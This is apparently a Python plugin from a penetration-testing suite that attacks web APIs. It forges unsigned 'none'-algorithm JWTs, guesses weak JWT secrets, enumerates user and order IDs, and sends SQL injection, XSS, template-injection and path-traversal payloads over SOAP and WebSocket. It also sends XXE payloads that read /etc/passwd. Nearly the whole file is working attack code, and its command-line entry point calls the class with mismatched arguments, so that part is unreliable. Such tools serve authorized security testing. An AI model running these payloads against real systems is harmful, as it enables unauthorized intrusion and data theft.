#!/usr/bin/env python3
"""
API Security Exploitation Plugin
Comprehensive API testing for REST, GraphQL, and SOAP APIs
"""

import requests
import json
import sys
from pathlib import Path
import jwt as pyjwt
from urllib.parse import urljoin, urlparse
import re
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed

# Add project root to path
project_root = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(project_root))
sys.path.insert(0, str(project_root / 'tools'))

try:
    from tools.plugin_system import PluginInterface
except ImportError:
    from plugin_system import PluginInterface

# Optional WebSocket support
try:
    import websocket
    import ssl
    WEBSOCKET_AVAILABLE = True
except ImportError:
    WEBSOCKET_AVAILABLE = False
    print("[!] websocket-client not available - WebSocket testing disabled")
    print("[!] Install with: pip install websocket-client")

class APIExploiter(PluginInterface):
    """API Security Exploitation Plugin"""

    name = "api_exploiter"
    version = "1.0.0"
    author = "Penetration Test Suite"
    description = "Comprehensive API security testing and exploitation"
    category = "api_testing"
    requires = ["requests", "PyJWT"]
    def __init__(self, config=None):
        super().__init__(config)
        self.target = None
        self.options = config or {}
        self.session = requests.Session()
        self.api_type = None
        self.auth_token = None
        self.test_bola = True
        self.test_jwt = True
        self.test_rate_limit = True
        self.id_range = range(1, 101)

    def run(self, target: str, **kwargs):
        """Main exploitation execution"""
        self.target = target if target.startswith('http') else f'http://{target}'
        self.options = kwargs

        self.api_type = self.options.get('api_type', 'rest')
        self.auth_token = self.options.get('auth_token', '')
        self.test_bola = self.options.get('test_bola', True)
        self.test_jwt = self.options.get('test_jwt', True)
        self.test_rate_limit = self.options.get('test_rate_limit', True)

        # Parse ID range
        id_range = self.options.get('id_range', '1-100')
        try:
            start, end = map(int, id_range.split('-'))
            self.id_range = range(start, end + 1)
        except:
            self.id_range = range(1, 101)

        if self.auth_token:
            self.session.headers.update({
                'Authorization': f'Bearer {self.auth_token}'
            })

        self.results = {
            'target': self.target,
            'api_type': self.api_type,
            'vulnerabilities': [],
            'findings': [],
            'endpoints': []
        }

        print(f"[*] Starting API security testing: {self.target}")
        print(f"[*] API Type: {self.api_type}")

        # API Discovery
        self.discover_api_endpoints()

        # JWT Testing
        if self.test_jwt and self.auth_token:
            self.test_jwt_security()

        # BOLA Testing
        if self.test_bola:
            self.test_bola_vulnerability()

        # Rate Limit Testing
        if self.test_rate_limit:
            self.test_rate_limiting()

        # GraphQL Specific Tests
        if self.api_type == 'graphql':
            self.test_graphql_introspection()
            self.test_graphql_batching()

        # SOAP Specific Tests
        if self.api_type == 'soap':
            self.test_soap_endpoints()
            self.test_soap_injection()

        # WebSocket Specific Tests
        if self.api_type == 'websocket':
            self.test_websocket_connection()
            self.test_websocket_injection()

        # Authentication Tests
        self.test_authentication()

        # HTTP Method Testing
        self.test_http_methods()

        return self.results

    def discover_api_endpoints(self):
        """Discover API endpoints"""
        print("[*] Discovering API endpoints...")

        # Common API paths
        api_paths = [
            '/api', '/api/v1', '/api/v2', '/api/v3',
            '/rest', '/rest/v1',
            '/graphql', '/graphiql',
            '/swagger', '/swagger.json', '/swagger.yaml',
            '/openapi.json', '/api-docs',
            '/api/swagger-ui', '/api/docs'
        ]

        found = 0
        for path in api_paths:
            try:
                url = urljoin(self.target, path)
                response = self.session.get(url, timeout=5, allow_redirects=False)

                if response.status_code in [200, 201, 301, 302]:
                    self.results['endpoints'].append({
                        'url': url,
                        'status': response.status_code,
                        'type': 'discovery'
                    })
                    found += 1
                    print(f"[+] Found: {url} ({response.status_code})")

            except:
                pass

        print(f"[+] Discovered {found} API endpoints")

    def test_jwt_security(self):
        """Test JWT token security"""
        print("[*] Testing JWT security...")

        try:
            # Decode without verification
            header = pyjwt.get_unverified_header(self.auth_token)
            payload = pyjwt.decode(self.auth_token, options={"verify_signature": False})

            self.results['findings'].append({
                'type': 'jwt_info',
                'algorithm': header.get('alg'),
                'payload': payload
            })

            print(f"[+] JWT Algorithm: {header.get('alg')}")

            # Test None algorithm
            self.test_jwt_none_algorithm()

            # Test weak secrets
            self.test_jwt_weak_secret()

        except Exception as e:
            print(f"[-] JWT test failed: {e}")

    def test_jwt_none_algorithm(self):
        """Test none algorithm vulnerability"""
        print("[*] Testing JWT none algorithm...")

        try:
            payload = pyjwt.decode(self.auth_token, options={"verify_signature": False})

            # Create header with none
            none_header = {'alg': 'none', 'typ': 'JWT'}

            # Try to encode without signature
            import base64
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(none_header).encode()
            ).decode().rstrip('=')

            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=')

            none_token = f"{header_b64}.{payload_b64}."

            # Test the none algorithm token
            test_response = self.session.get(
                self.target,
                headers={'Authorization': f'Bearer {none_token}'},
                timeout=5
            )

            if test_response.status_code == 200:
                self.results['vulnerabilities'].append({
                    'type': 'jwt_none_algorithm',
                    'severity': 'critical',
                    'description': 'Server accepts JWT with "none" algorithm',
                    'proof': none_token[:50] + '...'
                })
                print("[!] CRITICAL: None algorithm accepted!")

        except Exception as e:
            pass

    def test_jwt_weak_secret(self):
        """Test for weak JWT secrets"""
        print("[*] Testing for weak JWT secrets...")

        common_secrets = [
            'secret', 'Secret', 'SECRET',
            'jwt', 'JWT', 'jwt_secret',
            'password', 'admin', '123456'
        ]

        for secret in common_secrets:
            try:
                # Try to verify with this secret
                pyjwt.decode(
                    self.auth_token,
                    secret,
                    algorithms=['HS256', 'HS384', 'HS512']
                )

                self.results['vulnerabilities'].append({
                    'type': 'jwt_weak_secret',
                    'severity': 'critical',
                    'secret': secret,
                    'description': f'JWT uses weak secret: {secret}'
                })
                print(f"[!] CRITICAL: Weak secret found: {secret}")
                return

            except:
                continue

    def test_bola_vulnerability(self):
        """Test for BOLA/IDOR vulnerabilities"""
        print(f"[*] Testing for BOLA/IDOR (range: {self.id_range.start}-{self.id_range.stop-1})...")

        # Try to find endpoints with ID parameters
        test_endpoints = [
            '/api/users/{id}',
            '/api/v1/users/{id}',
            '/api/accounts/{id}',
            '/api/profile/{id}',
            '/api/user/{id}/profile',
            '/api/orders/{id}'
        ]

        vulnerable_endpoints = []

        for endpoint_template in test_endpoints:
            accessible = 0
            for user_id in list(self.id_range)[:20]:  # Test first 20 IDs
                try:
                    url = urljoin(self.target, endpoint_template.format(id=user_id))
                    response = self.session.get(url, timeout=5)

                    if response.status_code == 200:
                        accessible += 1

                except:
                    pass

            if accessible > 1:  # If multiple IDs are accessible
                vulnerable_endpoints.append(endpoint_template)
                self.results['vulnerabilities'].append({
                    'type': 'bola_idor',
                    'severity': 'high',
                    'endpoint': endpoint_template,
                    'accessible_count': accessible,
                    'description': f'BOLA/IDOR vulnerability - {accessible} IDs accessible'
                })
                print(f"[!] BOLA found: {endpoint_template} ({accessible} IDs)")

        if not vulnerable_endpoints:
            print("[+] No BOLA/IDOR detected")

    def test_rate_limiting(self):
        """Test API rate limiting"""
        print("[*] Testing rate limiting...")

        # Make rapid requests
        requests_to_make = 50
        successful = 0
        rate_limited = 0

        for i in range(requests_to_make):
            try:
                response = self.session.get(self.target, timeout=2)

                if response.status_code == 200:
                    successful += 1
                elif response.status_code == 429:
                    rate_limited += 1
                    break

            except:
                pass

        if rate_limited == 0:
            self.results['vulnerabilities'].append({
                'type': 'no_rate_limiting',
                'severity': 'medium',
                'requests_made': successful,
                'description': 'No rate limiting detected'
            })
            print(f"[!] No rate limiting ({successful}/{requests_to_make} requests succeeded)")
        else:
            print(f"[+] Rate limiting active (limited after {successful} requests)")

    def test_graphql_introspection(self):
        """Test GraphQL introspection"""
        print("[*] Testing GraphQL introspection...")

        introspection_query = {
            "query": """
            {
                __schema {
                    queryType { name }
                    types { name }
                }
            }
            """
        }

        try:
            response = self.session.post(
                self.target,
                json=introspection_query,
                timeout=10
            )

            if response.status_code == 200:
                data = response.json()
                if '__schema' in str(data):
                    self.results['vulnerabilities'].append({
                        'type': 'graphql_introspection_enabled',
                        'severity': 'medium',
                        'description': 'GraphQL introspection is enabled'
                    })
                    print("[!] GraphQL introspection enabled")

                    # Count types
                    types = data.get('data', {}).get('__schema', {}).get('types', [])
                    print(f"[+] Found {len(types)} types in schema")

        except:
            pass

    def test_graphql_batching(self):
        """Test GraphQL batch queries"""
        print("[*] Testing GraphQL batching...")

        batch_query = [
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
            {"query": "{ __typename }"}
        ]

        try:
            response = self.session.post(
                self.target,
                json=batch_query,
                timeout=10
            )

            if response.status_code == 200:
                data = response.json()
                if isinstance(data, list):
                    self.results['findings'].append({
                        'type': 'graphql_batching_enabled',
                        'description': 'GraphQL batch queries are supported'
                    })
                    print("[!] GraphQL batching enabled (rate limit bypass possible)")

        except:
            pass

    def test_authentication(self):
        """Test authentication mechanisms"""
        print("[*] Testing authentication...")

        # Test without authentication
        session_no_auth = requests.Session()

        try:
            response = session_no_auth.get(self.target, timeout=5)

            if response.status_code == 200:
                self.results['vulnerabilities'].append({
                    'type': 'unauthenticated_access',
                    'severity': 'high',
                    'description': 'API accessible without authentication'
                })
                print("[!] API accessible without authentication")
            elif response.status_code in [401, 403]:
                print("[+] Authentication required")

        except:
            pass

    def test_http_methods(self):
        """Test HTTP methods"""
        print("[*] Testing HTTP methods...")

        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']

        allowed_methods = []
        for method in methods:
            try:
                response = self.session.request(method, self.target, timeout=5)

                if response.status_code not in [404, 405]:
                    allowed_methods.append(method)

            except:
                pass

        if 'DELETE' in allowed_methods or 'PUT' in allowed_methods:
            self.results['findings'].append({
                'type': 'dangerous_methods_allowed',
                'methods': allowed_methods,
                'description': f'Potentially dangerous methods allowed: {", ".join(allowed_methods)}'
            })

        print(f"[+] Allowed methods: {', '.join(allowed_methods)}")

    def test_soap_endpoints(self):
        """Test SOAP API endpoints"""
        print("[*] Testing SOAP endpoints...")

        # Common SOAP paths
        soap_paths = [
            '/soap',
            '/services',
            '/ws',
            '/webservice',
            '/api/soap',
            '/service.asmx',
            '/service.svc'
        ]

        found_endpoints = []
        for path in soap_paths:
            try:
                url = urljoin(self.target, path)
                response = self.session.get(url, timeout=5)

                # Check for WSDL
                wsdl_url = f"{url}?wsdl"
                wsdl_response = self.session.get(wsdl_url, timeout=5)

                if wsdl_response.status_code == 200 and 'wsdl' in wsdl_response.text.lower():
                    found_endpoints.append(wsdl_url)
                    self.results['endpoints'].append({
                        'url': wsdl_url,
                        'type': 'soap_wsdl',
                        'status': wsdl_response.status_code
                    })
                    print(f"[+] Found SOAP WSDL: {wsdl_url}")

                    # Try to parse WSDL
                    try:
                        root = ET.fromstring(wsdl_response.content)
                        operations = root.findall('.//{http://schemas.xmlsoap.org/wsdl/}operation')
                        print(f"[+] Found {len(operations)} operations in WSDL")

                        # Check if operations are listed (information disclosure)
                        if len(operations) > 0:
                            self.results['findings'].append({
                                'type': 'soap_wsdl_exposed',
                                'url': wsdl_url,
                                'operations_count': len(operations),
                                'description': f'WSDL exposed with {len(operations)} operations'
                            })

                    except:
                        pass

            except:
                pass

        if not found_endpoints:
            print("[-] No SOAP endpoints found")

    def test_soap_injection(self):
        """Test for SOAP injection vulnerabilities"""
        print("[*] Testing SOAP injection...")

        # XML injection payloads
        injection_payloads = [
            "' OR '1'='1",
            "1' OR '1' = '1",
            "<![CDATA[<script>alert(1)</script>]]>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            "' OR 1=1--",
            "admin'--",
        ]

        # Basic SOAP envelope template
        soap_template = """<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <TestMethod xmlns="http://tempuri.org/">
            <param>{payload}</param>
        </TestMethod>
    </soap:Body>
</soap:Envelope>"""

        for payload in injection_payloads:
            try:
                soap_body = soap_template.format(payload=payload)

                response = self.session.post(
                    self.target,
                    data=soap_body,
                    headers={'Content-Type': 'text/xml; charset=utf-8'},
                    timeout=10
                )

                # Check for error messages
                if any(err in response.text.lower() for err in ['sql', 'syntax', 'error', 'exception', 'ora-', 'mysql']):
                    self.results['vulnerabilities'].append({
                        'type': 'soap_injection',
                        'severity': 'high',
                        'payload': payload,
                        'description': 'SOAP injection vulnerability detected',
                        'response_snippet': response.text[:200]
                    })
                    print(f"[!] SOAP injection found with payload: {payload[:30]}")
                    break

            except:
                pass

        # Test for XXE (XML External Entity)
        print("[*] Testing for XXE vulnerabilities...")

        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <TestMethod>
            <param>&xxe;</param>
        </TestMethod>
    </soap:Body>
</soap:Envelope>"""

        try:
            response = self.session.post(
                self.target,
                data=xxe_payload,
                headers={'Content-Type': 'text/xml; charset=utf-8'},
                timeout=10
            )

            # Check if file content is reflected
            if 'root:' in response.text or '/bin/bash' in response.text:
                self.results['vulnerabilities'].append({
                    'type': 'xxe_vulnerability',
                    'severity': 'critical',
                    'description': 'XXE vulnerability - server processes external entities',
                    'proof': 'Server returned file content'
                })
                print("[!] CRITICAL: XXE vulnerability found!")

        except:
            pass

    def test_websocket_connection(self):
        """Test WebSocket connection and security"""
        if not WEBSOCKET_AVAILABLE:
            print("[!] WebSocket testing skipped - websocket-client not installed")
            return

        print("[*] Testing WebSocket connection...")

        # Convert http(s) to ws(s)
        ws_url = self.target.replace('http://', 'ws://').replace('https://', 'wss://')

        # Common WebSocket paths
        ws_paths = ['', '/ws', '/websocket', '/socket', '/api/ws', '/chat', '/stream']

        for path in ws_paths:
            try:
                test_url = ws_url + path

                # Try to connect
                ws = websocket.create_connection(
                    test_url,
                    timeout=5,
                    sslopt={"cert_reqs": ssl.CERT_NONE}
                )

                self.results['endpoints'].append({
                    'url': test_url,
                    'type': 'websocket',
                    'status': 'connected'
                })
                print(f"[+] WebSocket connection successful: {test_url}")

                # Test for authentication
                # Try to send data without auth
                try:
                    ws.send(json.dumps({'type': 'test', 'data': 'hello'}))
                    result = ws.recv()

                    if result:
                        self.results['vulnerabilities'].append({
                            'type': 'websocket_no_auth',
                            'severity': 'medium',
                            'url': test_url,
                            'description': 'WebSocket accepts connections without authentication',
                            'response': result[:100]
                        })
                        print("[!] WebSocket accepts unauthenticated connections")

                except Exception as e:
                    pass

                ws.close()
                break  # Found working endpoint

            except Exception as e:
                continue

    def test_websocket_injection(self):
        """Test for WebSocket injection vulnerabilities"""
        if not WEBSOCKET_AVAILABLE:
            return

        print("[*] Testing WebSocket injection...")

        ws_url = self.target.replace('http://', 'ws://').replace('https://', 'wss://')

        injection_payloads = [
            {"message": "' OR '1'='1"},
            {"message": "<script>alert(1)</script>"},
            {"message": "../../../etc/passwd"},
            {"command": "'; DROP TABLE users--"},
            {"type": "message", "data": "${7*7}"},
            {"payload": "{{7*7}}"}
        ]

        try:
            ws = websocket.create_connection(
                ws_url,
                timeout=5,
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )

            for payload in injection_payloads:
                try:
                    # Send payload
                    ws.send(json.dumps(payload))

                    # Try to receive response (with timeout)
                    ws.settimeout(2)
                    response = ws.recv()

                    # Check for error messages or injection success
                    if any(err in response.lower() for err in ['error', 'sql', 'syntax', 'exception', '49']):
                        self.results['vulnerabilities'].append({
                            'type': 'websocket_injection',
                            'severity': 'high',
                            'payload': str(payload),
                            'description': 'WebSocket injection vulnerability detected',
                            'response_snippet': response[:200]
                        })
                        print(f"[!] WebSocket injection found: {payload}")
                        break

                except:
                    continue

            ws.close()

        except Exception as e:
            print(f"[-] WebSocket injection test failed: {e}")


def main(target, options=None):
    """Plugin entry point"""
    exploiter = APIExploiter(target, options)
    results = exploiter.run()

    # Print summary
    print("\n" + "="*60)
    print("API SECURITY SCAN SUMMARY")
    print("="*60)
    print(f"Vulnerabilities: {len(results['vulnerabilities'])}")
    print(f"Findings: {len(results['findings'])}")
    print(f"Endpoints: {len(results['endpoints'])}")

    # Print critical/high severity vulns
    critical = [v for v in results['vulnerabilities'] if v.get('severity') in ['critical', 'high']]
    if critical:
        print(f"\nCritical/High Severity Issues: {len(critical)}")
        for vuln in critical:
            print(f"  - {vuln['type']}: {vuln.get('description', 'N/A')}")

    return results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url> [auth_token]")
        sys.exit(1)

    target = sys.argv[1]
    options = {}

    if len(sys.argv) > 2:
        options['auth_token'] = sys.argv[2]

    result = main(target, options)
    print(json.dumps(result, indent=2))
